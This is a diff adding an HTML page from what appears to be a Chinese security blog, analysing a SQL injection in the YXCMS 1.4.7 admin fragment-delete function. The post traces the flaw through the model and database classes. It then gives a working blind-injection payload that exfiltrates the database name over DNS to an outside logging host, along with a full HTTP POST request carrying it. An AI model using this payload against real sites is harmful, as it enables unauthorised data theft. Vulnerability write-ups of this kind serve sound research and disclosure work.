@@ -1,0 +1,378 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>She11c0de&#39;s blogs</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="YXCMS 1.4.7SQL注入一、漏洞简介二、漏洞影响1.4.7 三、复现过程漏洞分析查看漏洞文件protected&#x2F;apps&#x2F;admin&#x2F;controller&#x2F;fragmentController.php的第63行 public function del() &amp;#123;     if(!$this-&gt;isPost())&amp;#123;         $id&#x3D;intval($_GET[&amp;#">
+<meta property="og:type" content="article">
+<meta property="og:title" content="She11c0de&#39;s blogs">
+<meta property="og:url" content="https://she11c0de.github.io/2022/07/07/YXcms/YXCMS%201.4.7SQL%E6%B3%A8%E5%85%A5/index.html">
+<meta property="og:site_name" content="She11c0de&#39;s blogs">
+<meta property="og:description" content="YXCMS 1.4.7SQL注入一、漏洞简介二、漏洞影响1.4.7 三、复现过程漏洞分析查看漏洞文件protected&#x2F;apps&#x2F;admin&#x2F;controller&#x2F;fragmentController.php的第63行 public function del() &amp;#123;     if(!$this-&gt;isPost())&amp;#123;         $id&#x3D;intval($_GET[&amp;#">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://she11c0de.github.io/resource/YXCMS1.4.7SQL%E6%B3%A8%E5%85%A5/media/rId27.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/YXCMS1.4.7SQL%E6%B3%A8%E5%85%A5/media/rId28.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/YXCMS1.4.7SQL%E6%B3%A8%E5%85%A5/media/rId30.shtml">
+<meta property="article:published_time" content="2022-07-08T06:26:08.628Z">
+<meta property="article:modified_time" content="2022-07-08T07:24:51.398Z">
+<meta property="article:author" content="She11c0de">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://she11c0de.github.io/resource/YXCMS1.4.7SQL%E6%B3%A8%E5%85%A5/media/rId27.png">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/scrollUp/image.css">
+
+  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <div class="logo">
+        <img src="/logo.png" alt="Profile Picture">
+      </div>
+      <div id="title">She11c0de's blogs</div>
+      
+       <ul class="my-socials">
+  
+ 
+</ul>
+    </div>
+  </div>
+  <div id="header-inner" class="">
+    <nav id="main-nav">
+      <a id="main-nav-toggle" class="nav-icon"></a>
+      <!--
+        
+          
+            <a class="main-nav-link" href="/">首页</a>
+          
+            <a class="main-nav-link" href="/categories/life">生活</a>
+          
+            <a class="main-nav-link" href="/archives">归档</a>
+          
+        
+      -->
+    </nav>
+    <nav id="title-nav" style="display:none">
+      <a href="/">She11c0de&#39;s blogs</a>
+      <img src="/logo.png" alt="Profile Picture">
+      <!--
+      <span id="title-nav-socials">
+        
+       
+     </span>
+      -->
+    </nav>
+    <nav id="sub-nav">
+      
+      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+    </nav>
+    <div id="search-form-wrap">
+      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
+        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
+        <input type="submit" value="" class="search-form-submit">
+        <input name=tn type=hidden value="bds">
+        <input name=cl type=hidden value="3">
+        <input name=ct type=hidden value="2097152">
+        <input type="hidden" name="si" value="she11c0de.github.io">
+      </form>
+    </div>
+  </div>
+  <div class="site-nav" style="display: none;">
+    <ul>
+      
+      
+        <li><a href="/">首页</a></li>
+      
+        <li><a href="/categories/life">生活</a></li>
+      
+        <li><a href="/archives">归档</a></li>
+      
+      
+    </ul>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-YXcms/YXCMS 1.4.7SQL注入" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/YXcms/YXCMS%201.4.7SQL%E6%B3%A8%E5%85%A5/" class="article-date">
+  <time datetime="2022-07-08T06:26:08.628Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="YXCMS-1-4-7SQL注入"><a href="#YXCMS-1-4-7SQL注入" class="headerlink" title="YXCMS 1.4.7SQL注入"></a>YXCMS 1.4.7SQL注入</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>1.4.7</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>查看漏洞文件protected/apps/admin/controller/fragmentController.php的第63行</p>
+<pre><code>public function del()
+&#123;
+    if(!$this-&gt;isPost())&#123;
+        $id=intval($_GET[&#39;id&#39;]);
+        if(empty($id)) $this-&gt;error(&#39;您没有选择~&#39;);
+        if(model(&#39;fragment&#39;)-&gt;delete(&quot;id=&#39;$id&#39;&quot;))
+        echo 1;
+        else echo &#39;删除失败~&#39;;
+    &#125;else&#123;
+        if(empty($_POST[&#39;delid&#39;])) $this-&gt;error(&#39;您没有选择~&#39;);
+        $delid=implode(&#39;,&#39;,$_POST[&#39;delid&#39;]);
+        if(model(&#39;fragment&#39;)-&gt;delete(&#39;id in (&#39;.$delid.&#39;)&#39;))
+        $this-&gt;success(&#39;删除成功&#39;,url(&#39;fragment/index&#39;));
+    &#125;
+&#125;
+</code></pre>
+<p>我们跟if(model(&#39;fragment&#39;)-&gt;delete(&quot;id=&#39;$id&#39;&quot;)),它会先到protected/core.php文件里面的model</p>
+<pre><code>function model($model)&#123;
+    static $objArray = array();
+    $className = $model . &#39;Model&#39;;
+    if( !is_object($objArray[$className]) )&#123;
+        if( !class_exists($className) ) &#123;
+            throw new Exception(config(&#39;_APP_NAME&#39;). &#39;/&#39; . $className . &#39;.php 模型类不存在&#39;);
+        &#125;
+        $objArray[$className] = new $className();
+    &#125;
+    return $objArray[$className];
+&#125;
+</code></pre>
+<p>然后到protected/apps/admin/model/fragmentModel.php</p>
+<pre><code>&lt;?php
+class fragmentModel extends baseModel&#123;
+    protected $table = &#39;fragment&#39;;
+&#125;
+</code></pre>
+<p>继续protected/base/model/baseModel.php</p>
+<pre><code>&lt;?php
+class baseModel extends model&#123;
+     protected $prefix=&#39;&#39;;
+     public function __construct( $database= &#39;DB&#39;,$force = false )&#123;
+        parent::__construct();
+        $this-&gt;prefix=config(&#39;DB_PREFIX&#39;);
+    &#125;
+&#125;
+</code></pre>
+<p>再来到最底层的数据库操作类protected/base/model/model.php的第45行</p>
+<pre><code>public function delete($condition)&#123;
+return $this-&gt;model-&gt;table($this-&gt;table, $this-&gt;ignoreTablePrefix)-&gt;where($condition)-&gt;delete();
+    &#125;
+</code></pre>
+<p>这个delete()是从哪里来的，我们来看第十三行的代码,创建了一个对象cpModel</p>
+<pre><code>static public function connect($config, $force=false)&#123;
+        static $model = NULL;
+        if( $force==true || empty($model) )&#123;
+            $model = new cpModel($config);
+        &#125;
+        return $model;
+    &#125;
+</code></pre>
+<p>漏洞文件在protected/include/core/cpModel.class.php,</p>
+<pre><code>public function delete() &#123;
+        $table = $this-&gt;options[&#39;table&#39;];   //当前表
+        $where = $this-&gt;_parseCondition();  //条件
+        if ( empty($where) ) return false; //删除条件为空时，则返回false，避免数据不小心被全部删除
+
+        $this-&gt;sql = &quot;DELETE FROM $table $where&quot;;
+        $query = $this-&gt;db-&gt;execute($this-&gt;sql);
+        return $this-&gt;db-&gt;affectedRows();
+    &#125;
+</code></pre>
+<p>这里用到了一个方法_parseCondition()</p>
+<pre><code>private function _parseCondition() &#123;
+        $condition = $this-&gt;db-&gt;parseCondition($this-&gt;options);
+        $this-&gt;options[&#39;where&#39;] = &#39;&#39;;
+        $this-&gt;options[&#39;group&#39;] = &#39;&#39;;
+        $this-&gt;options[&#39;having&#39;] = &#39;&#39;;
+        $this-&gt;options[&#39;order&#39;] = &#39;&#39;;
+        $this-&gt;options[&#39;limit&#39;] = &#39;&#39;;
+        $this-&gt;options[&#39;field&#39;] = &#39;*&#39;;      
+        return $condition;      
+    &#125;
+&#125;
+</code></pre>
+<p>这个函数是在protected/include/core/db/cpMysql.class.php的128行</p>
+<pre><code>public function parseCondition($options) &#123;
+        $condition = &quot;&quot;;
+        if(!empty($options[&#39;where&#39;])) &#123;
+            $condition = &quot; WHERE &quot;;
+            if(is_string($options[&#39;where&#39;])) &#123;
+                $condition .= $options[&#39;where&#39;];
+            &#125; else if(is_array($options[&#39;where&#39;])) &#123;
+                    foreach($options[&#39;where&#39;] as $key =&gt; $value) &#123;
+                         $condition .= &quot; `$key` = &quot; . $this-&gt;escape($value) . &quot; AND &quot;;
+                    &#125;
+                    $condition = substr($condition, 0,-4);  
+            &#125; else &#123;
+                $condition = &quot;&quot;;
+            &#125;
+        &#125;
+
+        if( !empty($options[&#39;group&#39;]) &amp;&amp; is_string($options[&#39;group&#39;]) ) &#123;
+            $condition .= &quot; GROUP BY &quot; . $options[&#39;group&#39;];
+        &#125;
+        if( !empty($options[&#39;having&#39;]) &amp;&amp; is_string($options[&#39;having&#39;]) ) &#123;
+            $condition .= &quot; HAVING &quot; .  $options[&#39;having&#39;];
+        &#125;
+        if( !empty($options[&#39;order&#39;]) &amp;&amp; is_string($options[&#39;order&#39;]) ) &#123;
+            $condition .= &quot; ORDER BY &quot; .  $options[&#39;order&#39;];
+        &#125;
+        if( !empty($options[&#39;limit&#39;]) &amp;&amp; (is_string($options[&#39;limit&#39;]) || is_numeric($options[&#39;limit&#39;])) ) &#123;
+            $condition .= &quot; LIMIT &quot; .  $options[&#39;limit&#39;];
+        &#125;
+        if( empty($condition) ) return &quot;&quot;;
+        return $condition;
+    &#125;
+</code></pre>
+<p>里面有一个行数来过滤escape,我们找到74行的这个函数定义</p>
+<pre><code>public function escape($value) &#123;
+        if( isset($this-&gt;_readLink) ) &#123;
+            $link = $this-&gt;_readLink;
+        &#125; elseif( isset($this-&gt;_writeLink) ) &#123;
+            $link = $this-&gt;_writeLink;
+        &#125; else &#123;
+            $link = $this-&gt;_getReadLink();
+        &#125;
+
+        if( is_array($value) ) &#123; 
+           return array_map(array($this, &#39;escape&#39;), $value);
+        &#125; else &#123;
+           if( get_magic_quotes_gpc() ) &#123;
+               $value = stripslashes($value);
+           &#125; 
+            return  &quot;&#39;&quot; . mysql_real_escape_string($value, $link) . &quot;&#39;&quot;;
+        &#125;
+    &#125;
+</code></pre>
+<p>不过这个函数有一句is_array如果是数组才会执行下面的过滤，如果不是的话就正常执行下去,没有任何sql的过滤就造成了注入漏洞。</p>
+<h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><p>这个盲注可以用<a target="_blank" rel="noopener" href="http://ceye.io和python脚本跑/">http://ceye.io和python脚本跑</a></p>
+<pre><code>http://0-sec.org/index.php?r=admin/fragment/index
+</code></pre>
+<p>payload:</p>
+<pre><code>1 and if((select load_file(concat(&#39;\\\\&#39;,(select database()),&#39;.xxxx.ceye.io\\abc&#39;))),1,1))-- 
+
+- 点击删除
+</code></pre>
+<p>post包</p>
+<pre><code>POST /index.php?r=admin/fragment/del HTTP/1.1
+Host: 0-sec.org
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 188
+Referer: [url]http://127.0.0.1/index.php?r=admin/fragment/index[/url]
+Cookie: PHPSESSID=bbei6n32cuevaf1lbi0n79rdj2; 
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+delid%5B%5D=select LOAD_FILE((CONCAT(&#39;\\\\&#39;,(SELECT DATABASE()),&#39;.8571e594.2m1.pw\\abc&#39;)))&amp;__hash__=529fbedab8a7b8a3f3f5a0f394f51cf2_08ebfXTKPoKd0tX4iq+aFMwhq5QkkRGC/NfUu/Ny83+UmU8u0MoCIj8
+</code></pre>
+<p><img src="/resource/YXCMS1.4.7SQL%E6%B3%A8%E5%85%A5/media/rId27.png"></p>
+<p>然后用burp截获数据，修改内容加上我们的payload，用原文的payload后面+会报错</p>
+<p><img src="/resource/YXCMS1.4.7SQL%E6%B3%A8%E5%85%A5/media/rId28.png"></p>
+<p>然后进入<a target="_blank" rel="noopener" href="http://ceye.io/records/dns">http://ceye.io/records/dns</a> 查看我们的数据</p>
+<p><img src="/resource/YXCMS1.4.7SQL%E6%B3%A8%E5%85%A5/media/rId30.shtml"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/YXcms/YXCMS%201.4.7SQL%E6%B3%A8%E5%85%A5/" data-id="cl5c2qz6m00nky8v14eo41etp" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2022/07/07/YXcms/YXCMS%201.4.7%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          (no title)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/07/07/Yunyecms/Yunyecms%20V2.0.2%20%E5%90%8E%E5%8F%B0%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88%E4%BA%8C%EF%BC%89/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title"></div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 She11c0de<br>
+      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <!--
+      <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">首页</a>
+  
+    <a href="/categories/life" class="mobile-nav-link">生活</a>
+  
+    <a href="/archives" class="mobile-nav-link">归档</a>
+  
+</nav>
+    -->
+    
+
+<!-- 百度分享 start -->
+
+<!-- 百度分享 end -->
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+
+
+
+<script src="/js/jquery.scrollUp.min.js"></script>
+
+
+<script src="/js/jquery.transform.js"></script>
+
+
+<script src="/js/menu.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+<script src="/js/scrollUp.js"></script>
+
+
+  </div>
+</body>
+</html>
